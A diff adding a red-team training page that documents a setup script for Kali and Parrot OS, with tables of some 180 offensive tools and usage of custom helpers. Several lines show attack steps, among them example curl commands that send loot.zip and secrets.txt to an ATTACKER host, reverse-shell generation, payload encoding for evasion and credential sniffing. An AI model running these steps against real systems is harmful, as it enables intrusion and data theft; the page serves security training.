@@ -1,0 +1,528 @@
+---
+layout: training-page
+title: "Attacker Machine Setup — Red Team Academy"
+module: "Fundamentals"
+tags:
+  - setup
+  - kali
+  - parrot
+  - tools
+  - automation
+page_key: "fundamentals-attacker-setup"
+render_with_liquid: false
+---
+<h1>Attacker Machine Setup</h1>
+
+  <p>A fully automated setup script that installs and configures every tool referenced across Red Team Academy. It works on both <strong>Kali Linux</strong> (2025.x / 2026.x) and <strong>Parrot OS</strong> (6.x). The script is modular &mdash; install everything at once or pick specific categories.</p>
+
+  <h2>Quick Start</h2>
+
+  <pre><code># Download the setup script
+curl -sLO https://your-rta-host/scripts/rta-setup.sh
+chmod +x rta-setup.sh
+
+# Install everything (takes 30-60 minutes depending on connection)
+sudo ./rta-setup.sh --all
+
+# Or install specific modules
+sudo ./rta-setup.sh --module core --module recon --module ad
+
+# Preview what will be installed without doing anything
+sudo ./rta-setup.sh --dry-run --all
+
+# List available modules
+sudo ./rta-setup.sh --list</code></pre>
+
+  <h2>Available Modules</h2>
+
+  <table>
+    <tr><th>Module</th><th>Description</th><th>Key Tools</th></tr>
+    <tr><td><code>core</code></td><td>System packages, compilers, runtimes</td><td>Docker, Go, Rust, MinGW, .NET SDK, Python venv, pipx</td></tr>
+    <tr><td><code>recon</code></td><td>Reconnaissance &amp; OSINT</td><td>Nmap, Masscan, Subfinder, Amass, httpx, Nuclei, ffuf, Katana, BBOT, reconftw</td></tr>
+    <tr><td><code>ad</code></td><td>Active Directory attacks</td><td>Impacket, NetExec, BloodHound, Certipy, Kerbrute, Evil-WinRM, Responder, SharpCollection</td></tr>
+    <tr><td><code>exploitation</code></td><td>Exploit frameworks &amp; tools</td><td>Metasploit, sqlmap, pwntools, Ghidra, Radare2, PayloadsAllTheThings</td></tr>
+    <tr><td><code>post-exploitation</code></td><td>Privilege escalation &amp; lateral movement</td><td>PEASS-ng (LinPEAS/WinPEAS), PrintSpoofer, GodPotato, Seatbelt</td></tr>
+    <tr><td><code>evasion</code></td><td>AV/EDR evasion &amp; obfuscation</td><td>ScareCrow, Donut, Freeze, Garble, PEzor, sRDI, Veil, Codecepticon</td></tr>
+    <tr><td><code>c2</code></td><td>Command &amp; Control frameworks</td><td>Sliver, Havoc, Mythic, GoPhish, Evilginx, Malleable C2 Profiles</td></tr>
+    <tr><td><code>web</code></td><td>Web application attacks</td><td>SQLMap, SSRFmap, GraphQLmap, tplmap, Smuggler, JWT_tool, Commix, Arjun</td></tr>
+    <tr><td><code>wireless</code></td><td>Wireless &amp; RF attacks</td><td>Aircrack-ng, Bettercap, EAPHammer, Kismet, hcxtools, Proxmark3</td></tr>
+    <tr><td><code>iot</code></td><td>IoT &amp; firmware hacking</td><td>Binwalk, EMBA, Firmwalker, RouterSploit, OpenOCD</td></tr>
+    <tr><td><code>pivoting</code></td><td>Tunneling &amp; network pivoting</td><td>Chisel, Ligolo-ng, sshuttle, rpivot, dnscat2, proxychains</td></tr>
+    <tr><td><code>password</code></td><td>Credential cracking &amp; spraying</td><td>Hashcat, John the Ripper, Hydra, CeWL, CUPP, DefaultCreds</td></tr>
+    <tr><td><code>cloud</code></td><td>Cloud attack tools</td><td>AWS CLI, Azure CLI, Pacu, ScoutSuite, Prowler, TokenTacticsV2</td></tr>
+    <tr><td><code>mobile</code></td><td>Mobile security testing</td><td>Frida, Objection, MobSF, APKTool, jadx</td></tr>
+    <tr><td><code>network</code></td><td>Network-level attacks</td><td>Responder, mitm6, Bettercap, Ettercap, Yersinia</td></tr>
+    <tr><td><code>ai</code></td><td>AI/LLM red team tools</td><td>Garak, LangChain, smolagents, HuggingFace</td></tr>
+    <tr><td><code>dev-tools</code></td><td>Offensive development</td><td>pycryptodome, Scapy, Paramiko, ldap3, Playwright</td></tr>
+    <tr><td><code>wordlists</code></td><td>Wordlists &amp; payload collections</td><td>SecLists, OneListForAll, FuzzDB, Rockyou, Commonspeak2</td></tr>
+    <tr><td><code>custom-tools</code></td><td>RTA custom scripts</td><td>rta-scan, rta-subenum, rta-revshell, rta-serve, rta-adenum, rta-webrecon</td></tr>
+  </table>
+
+  <h2>Directory Layout</h2>
+
+  <pre><code>/opt/red-team/                  # Root directory for all tools
+  ├── custom/                    # RTA custom tools (rta-* commands)
+  ├── venvs/                     # Python virtual environments per module
+  ├── go-tools/                  # Go module cache
+  ├── Responder/                 # Cloned tool repos
+  ├── SharpCollection/
+  ├── PayloadsAllTheThings/
+  ├── ...
+/opt/wordlists/                  # All wordlists
+  ├── SecLists/
+  ├── OneListForAll/
+  ├── fuzzdb/
+  ├── rockyou.txt                # Symlink to /usr/share/wordlists/</code></pre>
+
+  <h2>Custom Tools Reference</h2>
+
+  <p>The setup script installs 10 custom tools, each prefixed with <code>rta-</code> and symlinked into <code>/usr/local/bin/</code>.</p>
+
+  <h3>rta-scan &mdash; Quick Port Scanner</h3>
+
+  <p>Async port scanner with service banner grabbing. Faster than default Nmap for quick sweeps.</p>
+
+  <pre><code># Scan common ports
+rta-scan 10.10.10.5
+
+# Scan full range with more threads
+rta-scan 10.10.10.5 --ports 1-65535 --threads 500</code></pre>
+
+  <h3>rta-subenum &mdash; Subdomain Aggregator</h3>
+
+  <p>Aggregates subdomains from subfinder, amass, assetfinder, crt.sh, waybackurls, and gau. Deduplicates and optionally probes live hosts with httpx.</p>
+
+  <pre><code># Enumerate subdomains
+rta-subenum example.com
+
+# Save to specific file
+rta-subenum example.com output-subs.txt</code></pre>
+
+  <h3>rta-revshell &mdash; Reverse Shell Generator</h3>
+
+  <p>Generates reverse shell one-liners for 20+ languages and methods, including msfvenom commands and base64-encoded PowerShell.</p>
+
+  <pre><code># Generate a bash reverse shell
+rta-revshell 10.10.14.5 4444
+
+# Specific shell type
+rta-revshell 10.10.14.5 4444 -t python-pty
+
+# Base64-encoded PowerShell
+rta-revshell 10.10.14.5 4444 -t powershell-b64
+
+# Print all shell types at once
+rta-revshell 10.10.14.5 4444 --all
+
+# List available types
+rta-revshell 10.10.14.5 4444 --list</code></pre>
+
+  <h3>rta-serve &mdash; HTTP File Server with Upload</h3>
+
+  <p>Quick file transfer server. Supports GET (download) and POST (upload) for exfiltration or payload staging.</p>
+
+  <pre><code># Serve current directory
+rta-serve
+
+# Custom port and directory
+rta-serve -p 9090 -d /opt/red-team/payloads
+
+# Enable upload (attacker receives files from target)
+rta-serve --upload
+
+# Target uploads a file:
+# curl -X POST --data-binary @loot.zip http://ATTACKER:8080/loot.zip
+# curl -F 'file=@secrets.txt' http://ATTACKER:8080/</code></pre>
+
+  <h3>rta-adenum &mdash; AD Quick Enumeration</h3>
+
+  <p>Wraps NetExec, Impacket, and BloodHound into a single command that runs domain enumeration and saves everything to a timestamped directory.</p>
+
+  <pre><code># Run full AD enumeration
+rta-adenum 192.168.56.100 corp.local jsmith 'P@ssw0rd!'
+
+# Output directory contains:
+# users.txt, groups.txt, shares.txt, pass-policy.txt,
+# kerberoast-hashes.txt, asrep-hashes.txt, bloodhound/</code></pre>
+
+  <h3>rta-webrecon &mdash; Web Recon Pipeline</h3>
+
+  <p>Automated web recon: technology fingerprinting, header analysis, SSL inspection, directory brute force, crawling, JS endpoint extraction, vulnerability scanning, and WAF detection.</p>
+
+  <pre><code># Full recon pipeline against a target
+rta-webrecon https://target.com</code></pre>
+
+  <h3>rta-listener &mdash; Quick Listener Setup</h3>
+
+  <p>Start listeners with various backends.</p>
+
+  <pre><code># Netcat listener
+rta-listener 4444
+
+# Socat TTY listener (full interactive shell)
+rta-listener 4444 --type socat
+
+# Metasploit multi/handler
+rta-listener 4444 --type msfmulti
+
+# pwncat (if installed)
+rta-listener 4444 --type pwncat</code></pre>
+
+  <h3>rta-hashid &mdash; Hash Type Identifier</h3>
+
+  <p>Identifies hash types and provides the correct Hashcat mode and John format.</p>
+
+  <pre><code># Identify a hash
+rta-hashid '$krb5tgs$23$*user$realm$...'
+rta-hashid '5f4dcc3b5aa765d61d8327deb882cf99'
+
+# Pipe from file
+cat hash.txt | rta-hashid</code></pre>
+
+  <h3>rta-encode &mdash; Payload Encoder</h3>
+
+  <p>Encode shellcode or payloads for evasion. Supports XOR (outputs C array), Base64, and AES-256-CBC.</p>
+
+  <pre><code># XOR encode shellcode
+rta-encode payload.bin -m xor -k 'mykey'
+
+# AES encrypt
+rta-encode payload.bin -m aes -k 'secretkey' -o encrypted.bin
+
+# Base64
+rta-encode payload.bin -m b64</code></pre>
+
+  <h3>rta-credsniff &mdash; Credential Capture</h3>
+
+  <p>Quick setup for credential sniffing with Responder or targeted packet capture.</p>
+
+  <pre><code># Start Responder on eth0
+rta-credsniff eth0 --responder
+
+# Credential-focused packet capture
+rta-credsniff eth0 --tcpdump</code></pre>
+
+  <h2>Shell Environment</h2>
+
+  <p>The setup script creates <code>~/.rta-profile</code> and sources it from both <code>.bashrc</code> and <code>.zshrc</code>. It provides aliases, functions, and environment variables.</p>
+
+  <h3>Aliases</h3>
+
+  <pre><code># Navigation
+tools          # cd /opt/red-team
+wordlists      # cd /opt/wordlists
+custom         # cd /opt/red-team/custom
+
+# Common operations
+serve          # python3 -m http.server 8080
+myip           # External IP
+localip        # Local IP
+ports          # Show listening ports
+
+# Tool shortcuts
+nxc            # netexec
+msfconsole     # msfconsole -q (quiet mode)</code></pre>
+
+  <h3>Functions</h3>
+
+  <pre><code># Set target for the session
+target 10.10.10.5
+echo $TARGET    # 10.10.10.5
+echo $RHOST     # 10.10.10.5
+
+# Route traffic through a SOCKS proxy
+socks 1080      # Set SOCKS5 proxy on port 1080
+unsocks         # Clear proxy settings
+
+# Extract any archive format
+extract file.tar.gz
+extract file.7z
+extract file.zip</code></pre>
+
+  <h2>Complete Tool Inventory</h2>
+
+  <p>Total tools installed by <code>--all</code>: <strong>180+</strong> tools across 19 modules.</p>
+
+  <h3>Reconnaissance (40+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Nmap</td><td>apt</td><td>Port scanning, service detection, NSE scripts</td></tr>
+    <tr><td>Masscan</td><td>apt</td><td>Async mass port scanner</td></tr>
+    <tr><td>RustScan</td><td>cargo</td><td>Fast Rust-based port scanner</td></tr>
+    <tr><td>Subfinder</td><td>go install</td><td>Passive subdomain enumeration</td></tr>
+    <tr><td>Amass</td><td>go install</td><td>Attack surface mapping &amp; subdomain enum</td></tr>
+    <tr><td>httpx</td><td>go install</td><td>HTTP probing and technology detection</td></tr>
+    <tr><td>Nuclei</td><td>go install</td><td>Template-based vulnerability scanner</td></tr>
+    <tr><td>ffuf</td><td>go install</td><td>Web fuzzer (directories, parameters, vhosts)</td></tr>
+    <tr><td>Feroxbuster</td><td>cargo</td><td>Recursive content discovery</td></tr>
+    <tr><td>Katana</td><td>go install</td><td>Web crawler with JS rendering</td></tr>
+    <tr><td>BBOT</td><td>pipx</td><td>Modular OSINT automation</td></tr>
+    <tr><td>theHarvester</td><td>git clone</td><td>Email, subdomain, and name harvesting</td></tr>
+    <tr><td>Nikto</td><td>apt</td><td>Web server vulnerability scanner</td></tr>
+    <tr><td>WhatWeb</td><td>apt</td><td>Web technology fingerprinting</td></tr>
+    <tr><td>Wafw00f</td><td>apt</td><td>WAF detection</td></tr>
+    <tr><td>reconftw</td><td>git clone</td><td>Automated recon framework</td></tr>
+    <tr><td>DNSx</td><td>go install</td><td>Fast DNS toolkit</td></tr>
+    <tr><td>Assetfinder</td><td>go install</td><td>Quick subdomain discovery</td></tr>
+    <tr><td>Waybackurls</td><td>go install</td><td>Wayback Machine URL extraction</td></tr>
+    <tr><td>gau</td><td>go install</td><td>Get All URLs from multiple sources</td></tr>
+    <tr><td>hakrawler</td><td>go install</td><td>Fast web crawler</td></tr>
+    <tr><td>gospider</td><td>go install</td><td>Go-based web spider</td></tr>
+    <tr><td>puredns</td><td>go install</td><td>DNS bruteforce with wildcard detection</td></tr>
+    <tr><td>LinkFinder</td><td>git clone</td><td>JavaScript endpoint extraction</td></tr>
+    <tr><td>Ghost Scout</td><td>git clone</td><td>Cloud infrastructure enumeration</td></tr>
+    <tr><td>TREVORspray</td><td>pipx</td><td>Password spraying with SOCKS rotation</td></tr>
+    <tr><td>DNSChef</td><td>git clone</td><td>DNS proxy/spoofing</td></tr>
+    <tr><td>Nettacker</td><td>docker</td><td>OWASP automated pentesting</td></tr>
+  </table>
+
+  <h3>Active Directory (25+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Impacket</td><td>pipx</td><td>SMB/LDAP/Kerberos protocol toolkit (secretsdump, psexec, wmiexec, ntlmrelayx)</td></tr>
+    <tr><td>NetExec (nxc)</td><td>pipx</td><td>SMB/WinRM/LDAP auth testing &amp; lateral movement</td></tr>
+    <tr><td>BloodHound CE</td><td>apt + docker</td><td>AD attack path visualization</td></tr>
+    <tr><td>Certipy</td><td>pipx</td><td>ADCS enumeration and exploitation (ESC1-13)</td></tr>
+    <tr><td>Kerbrute</td><td>go install</td><td>Kerberos user enumeration &amp; password spray</td></tr>
+    <tr><td>Evil-WinRM</td><td>gem</td><td>WinRM shell with file transfer</td></tr>
+    <tr><td>Responder</td><td>git clone</td><td>LLMNR/NBT-NS/MDNS poisoner</td></tr>
+    <tr><td>Coercer</td><td>pipx</td><td>Multi-method coercion attacks</td></tr>
+    <tr><td>PetitPotam</td><td>git clone</td><td>EFSRPC coercion</td></tr>
+    <tr><td>mitm6</td><td>pipx</td><td>IPv6 MITM for relay attacks</td></tr>
+    <tr><td>pypykatz</td><td>pipx</td><td>Python LSASS dump parser</td></tr>
+    <tr><td>bloodyAD</td><td>pipx</td><td>AD object manipulation</td></tr>
+    <tr><td>ldeep</td><td>pipx</td><td>LDAP enumeration</td></tr>
+    <tr><td>SharpCollection</td><td>git clone</td><td>Pre-compiled .NET tools (Rubeus, SharpHound, Seatbelt, etc.)</td></tr>
+    <tr><td>PowerSploit</td><td>git clone</td><td>PowerView, PowerUp, Invoke-Mimikatz</td></tr>
+    <tr><td>Nishang</td><td>git clone</td><td>PowerShell offensive scripts</td></tr>
+    <tr><td>LaZagne</td><td>git clone</td><td>Application password extraction</td></tr>
+    <tr><td>Titanis</td><td>git clone</td><td>AD protocol attack toolkit</td></tr>
+    <tr><td>winproto</td><td>git clone</td><td>KDC &amp; NMF MITM toolkit</td></tr>
+    <tr><td>DonPAPI</td><td>git clone</td><td>DPAPI credential extraction</td></tr>
+  </table>
+
+  <h3>Exploitation (15+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Metasploit</td><td>apt</td><td>Exploitation framework &amp; post-exploitation</td></tr>
+    <tr><td>sqlmap</td><td>apt</td><td>SQL injection automation</td></tr>
+    <tr><td>pwntools</td><td>pip venv</td><td>CTF &amp; binary exploitation library</td></tr>
+    <tr><td>Ghidra</td><td>apt</td><td>NSA reverse engineering tool</td></tr>
+    <tr><td>Radare2</td><td>apt</td><td>RE framework</td></tr>
+    <tr><td>GDB + Pwndbg</td><td>apt</td><td>Debugger for exploit development</td></tr>
+    <tr><td>Ropper</td><td>pip venv</td><td>ROP gadget finder</td></tr>
+    <tr><td>PayloadsAllTheThings</td><td>git clone</td><td>Comprehensive payload reference</td></tr>
+    <tr><td>Atomic Red Team</td><td>git clone</td><td>MITRE ATT&amp;CK atomic tests</td></tr>
+  </table>
+
+  <h3>Post-Exploitation (10+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>LinPEAS</td><td>git clone + binary</td><td>Linux privilege escalation enumeration</td></tr>
+    <tr><td>WinPEAS</td><td>binary download</td><td>Windows privilege escalation enumeration</td></tr>
+    <tr><td>PrintSpoofer</td><td>git clone</td><td>Token impersonation via print spooler</td></tr>
+    <tr><td>GodPotato</td><td>git clone</td><td>SeImpersonatePrivilege exploitation</td></tr>
+    <tr><td>Seatbelt</td><td>git clone</td><td>C# security enumeration</td></tr>
+    <tr><td>LinEnum</td><td>git clone</td><td>Linux enumeration script</td></tr>
+    <tr><td>linux-exploit-suggester</td><td>git clone</td><td>Kernel exploit suggestion</td></tr>
+    <tr><td>Egress-Assess</td><td>git clone</td><td>Data exfiltration testing</td></tr>
+  </table>
+
+  <h3>Evasion &amp; Obfuscation (15+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>ScareCrow</td><td>git clone + go build</td><td>EDR evasion payload framework</td></tr>
+    <tr><td>Donut</td><td>go install</td><td>Convert PE/.NET/scripts to position-independent shellcode</td></tr>
+    <tr><td>Freeze</td><td>git clone + go build</td><td>Payload obfuscation via suspended processes</td></tr>
+    <tr><td>Garble</td><td>go install</td><td>Go binary obfuscator</td></tr>
+    <tr><td>PEzor</td><td>git clone</td><td>PE packer and obfuscator</td></tr>
+    <tr><td>sRDI</td><td>git clone</td><td>Reflective DLL injection shellcode</td></tr>
+    <tr><td>Shellter</td><td>apt</td><td>PE shellcode injection</td></tr>
+    <tr><td>UPX</td><td>apt</td><td>Executable packer</td></tr>
+    <tr><td>AVET</td><td>git clone</td><td>AV evasion tool</td></tr>
+    <tr><td>Veil</td><td>git clone</td><td>Payload obfuscation framework</td></tr>
+    <tr><td>Codecepticon</td><td>git clone</td><td>Source code obfuscation</td></tr>
+    <tr><td>EmojiChef</td><td>git clone</td><td>Emoji-based payload encoding</td></tr>
+    <tr><td>HookChain</td><td>git clone</td><td>Shellcode loader via hook chaining</td></tr>
+    <tr><td>Invoke-Obfuscation</td><td>git clone</td><td>PowerShell obfuscation</td></tr>
+    <tr><td>ConfuserEx</td><td>git clone</td><td>.NET assembly obfuscation</td></tr>
+  </table>
+
+  <h3>C2 Frameworks (10+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Metasploit</td><td>apt</td><td>Exploitation &amp; C2 (Meterpreter)</td></tr>
+    <tr><td>Sliver</td><td>installer script</td><td>Open-source C2 with HTTP/DNS/mTLS</td></tr>
+    <tr><td>Havoc</td><td>git clone</td><td>Modern C2 with Demon agent</td></tr>
+    <tr><td>Mythic</td><td>git clone</td><td>Modular C2 platform (Apollo, Poseidon agents)</td></tr>
+    <tr><td>GoPhish</td><td>git clone</td><td>Phishing campaign management</td></tr>
+    <tr><td>Evilginx</td><td>git clone</td><td>AiTM reverse proxy for credential capture</td></tr>
+    <tr><td>BaiaoC2</td><td>git clone</td><td>Go-based C2 framework</td></tr>
+    <tr><td>Malleable C2 Profiles</td><td>git clone</td><td>Traffic disguise profiles for Cobalt Strike</td></tr>
+    <tr><td>RedWarden</td><td>git clone</td><td>C2 redirector management</td></tr>
+  </table>
+
+  <h3>Web Hacking (20+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>SQLMap</td><td>apt</td><td>SQL injection automation</td></tr>
+    <tr><td>SSRFmap</td><td>git clone</td><td>SSRF exploitation</td></tr>
+    <tr><td>GraphQLmap</td><td>git clone</td><td>GraphQL enumeration &amp; exploitation</td></tr>
+    <tr><td>tplmap</td><td>git clone</td><td>Server-side template injection</td></tr>
+    <tr><td>Smuggler</td><td>git clone</td><td>HTTP request smuggling</td></tr>
+    <tr><td>x8</td><td>cargo</td><td>Hidden parameter discovery</td></tr>
+    <tr><td>NoMore403</td><td>git clone</td><td>403 bypass techniques</td></tr>
+    <tr><td>jwt_tool</td><td>git clone</td><td>JWT testing &amp; exploitation</td></tr>
+    <tr><td>Arjun</td><td>git clone</td><td>HTTP parameter discovery</td></tr>
+    <tr><td>Commix</td><td>git clone</td><td>Command injection exploitation</td></tr>
+    <tr><td>Social-Engineer Toolkit</td><td>git clone</td><td>Social engineering attacks</td></tr>
+    <tr><td>ShadowPhish</td><td>git clone</td><td>APT phishing toolkit</td></tr>
+    <tr><td>REcollapse</td><td>git clone</td><td>Regex-based input fuzzing</td></tr>
+    <tr><td>Reset Tolkien</td><td>pipx</td><td>Time-based token vulnerabilities</td></tr>
+    <tr><td>CORStest</td><td>git clone</td><td>CORS misconfiguration testing</td></tr>
+    <tr><td>OWASP ZAP</td><td>apt</td><td>Web proxy and scanner</td></tr>
+    <tr><td>Wfuzz</td><td>apt</td><td>Web fuzzer</td></tr>
+    <tr><td>BatchQL</td><td>git clone</td><td>GraphQL batch query attacks</td></tr>
+  </table>
+
+  <h3>Wireless &amp; IoT (15+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Aircrack-ng</td><td>apt</td><td>Wi-Fi cracking suite</td></tr>
+    <tr><td>Bettercap</td><td>apt</td><td>Network MITM, evil twin, BLE scanning</td></tr>
+    <tr><td>hcxtools / hcxdumptool</td><td>apt</td><td>WPA hash capture without deauth</td></tr>
+    <tr><td>EAPHammer</td><td>git clone</td><td>WPA Enterprise attacks</td></tr>
+    <tr><td>Kismet</td><td>apt</td><td>Wireless network detector</td></tr>
+    <tr><td>Proxmark3</td><td>git clone</td><td>RFID/NFC hacking</td></tr>
+    <tr><td>Killerbee</td><td>git clone</td><td>ZigBee assessment</td></tr>
+    <tr><td>EMBA</td><td>git clone</td><td>Embedded system firmware analysis</td></tr>
+    <tr><td>Firmwalker</td><td>git clone</td><td>Firmware enumeration</td></tr>
+    <tr><td>RouterSploit</td><td>git clone</td><td>Router exploitation framework</td></tr>
+    <tr><td>Binwalk</td><td>apt</td><td>Firmware binary analysis</td></tr>
+  </table>
+
+  <h3>Pivoting &amp; Tunneling (8 tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Chisel</td><td>go install</td><td>HTTP WebSocket tunnel with SOCKS5</td></tr>
+    <tr><td>Ligolo-ng</td><td>git clone + go build</td><td>TUN-based multi-agent tunneling</td></tr>
+    <tr><td>sshuttle</td><td>apt</td><td>Transparent VPN over SSH</td></tr>
+    <tr><td>rpivot</td><td>git clone</td><td>Reverse SOCKS proxy</td></tr>
+    <tr><td>dnscat2</td><td>git clone</td><td>DNS tunneling</td></tr>
+    <tr><td>proxychains</td><td>apt</td><td>Force TCP through SOCKS proxy</td></tr>
+    <tr><td>socat</td><td>apt</td><td>Bidirectional socket relay</td></tr>
+    <tr><td>WireGuard</td><td>apt</td><td>Modern VPN tunneling</td></tr>
+  </table>
+
+  <h3>Password &amp; Credential Tools (10+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>Hashcat</td><td>apt</td><td>GPU-accelerated hash cracking</td></tr>
+    <tr><td>John the Ripper</td><td>apt</td><td>CPU-based cracking with format support</td></tr>
+    <tr><td>Hydra</td><td>apt</td><td>Multi-protocol brute forcer</td></tr>
+    <tr><td>Medusa</td><td>apt</td><td>Parallel brute force</td></tr>
+    <tr><td>CeWL</td><td>apt</td><td>Wordlist generation from websites</td></tr>
+    <tr><td>Crunch</td><td>apt</td><td>Wordlist generation by pattern</td></tr>
+    <tr><td>CUPP</td><td>git clone</td><td>Profiled password generation</td></tr>
+    <tr><td>DefaultCreds</td><td>git clone</td><td>Default credentials database</td></tr>
+    <tr><td>MSOLSpray</td><td>git clone</td><td>Office 365 password spraying</td></tr>
+    <tr><td>Hashcat Rules</td><td>git clone</td><td>Advanced rule-based mutations</td></tr>
+  </table>
+
+  <h3>Cloud (10+ tools)</h3>
+
+  <table>
+    <tr><th>Tool</th><th>Install Method</th><th>Purpose</th></tr>
+    <tr><td>AWS CLI</td><td>installer</td><td>AWS management &amp; enumeration</td></tr>
+    <tr><td>Azure CLI</td><td>installer</td><td>Azure management &amp; enumeration</td></tr>
+    <tr><td>Pacu</td><td>pip venv</td><td>AWS exploitation framework</td></tr>
+    <tr><td>ScoutSuite</td><td>pip venv</td><td>Multi-cloud security auditing</td></tr>
+    <tr><td>Prowler</td><td>pip venv</td><td>AWS/Azure/GCP security assessment</td></tr>
+    <tr><td>Checkov</td><td>pip venv</td><td>IaC security scanning</td></tr>
+    <tr><td>TokenTacticsV2</td><td>git clone</td><td>Azure AD token manipulation</td></tr>
+    <tr><td>ROADtools</td><td>git clone</td><td>Azure AD enumeration</td></tr>
+    <tr><td>MicroBurst</td><td>git clone</td><td>Azure security toolkit</td></tr>
+    <tr><td>enumerate-iam</td><td>pipx</td><td>AWS IAM permission enumeration</td></tr>
+  </table>
+
+  <h2>Kali vs. Parrot OS Differences</h2>
+
+  <p>The script handles both distributions transparently. Key differences:</p>
+
+  <table>
+    <tr><th>Feature</th><th>Kali Linux</th><th>Parrot OS</th></tr>
+    <tr><td>Package manager</td><td>apt (Debian testing)</td><td>apt (Debian stable)</td></tr>
+    <tr><td>Pre-installed tools</td><td>Metasploit, Nmap, Aircrack, Hydra, John</td><td>Same + AnonSurf, additional privacy tools</td></tr>
+    <tr><td>Default shell</td><td>zsh</td><td>bash (some editions use zsh)</td></tr>
+    <tr><td>Python version</td><td>3.12+</td><td>3.11+</td></tr>
+    <tr><td>Docker</td><td>Available but not pre-installed</td><td>Available but not pre-installed</td></tr>
+  </table>
+
+  <p>The script detects the distro at runtime and adjusts accordingly. Both <code>.bashrc</code> and <code>.zshrc</code> are configured.</p>
+
+  <h2>Troubleshooting</h2>
+
+  <h3>Common Issues</h3>
+
+  <pre><code># Check the full installation log
+cat /var/log/rta-setup.log
+
+# Re-run a single module after fixing an issue
+sudo ./rta-setup.sh --module cloud
+
+# If Go tools fail, check Go is in PATH
+source /etc/profile.d/go-path.sh
+go version
+
+# If pipx tools fail, ensure pipx path
+pipx ensurepath
+source ~/.bashrc
+
+# If Docker tools fail
+sudo systemctl start docker
+sudo usermod -aG docker $USER
+# Then log out and back in</code></pre>
+
+  <h3>Post-Install Verification</h3>
+
+  <pre><code># Verify core tools
+nmap --version
+go version
+cargo --version
+ruby --version
+dotnet --version
+docker --version
+
+# Verify offensive tools
+netexec --help
+impacket-secretsdump --help
+nuclei -version
+ffuf -V
+chisel --help
+
+# Verify custom tools
+rta-revshell 127.0.0.1 4444 --list
+rta-hashid 5f4dcc3b5aa765d61d8327deb882cf99
+rta-scan 127.0.0.1 --ports 1-100</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Setup Script Source &mdash; <code>/scripts/rta-setup.sh</code> (this repository)</li>
+    <li>Kali Linux &mdash; <code>kali.org</code></li>
+    <li>Parrot OS &mdash; <code>parrotsec.org</code></li>
+    <li>SecLists &mdash; <code>github.com/danielmiessler/SecLists</code></li>
+    <li>PayloadsAllTheThings &mdash; <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+    <li>PEASS-ng &mdash; <code>github.com/peass-ng/PEASS-ng</code></li>
+    <li>Impacket &mdash; <code>github.com/fortra/impacket</code></li>
+    <li>ProjectDiscovery Tools &mdash; <code>github.com/projectdiscovery</code></li>
+  </ul>
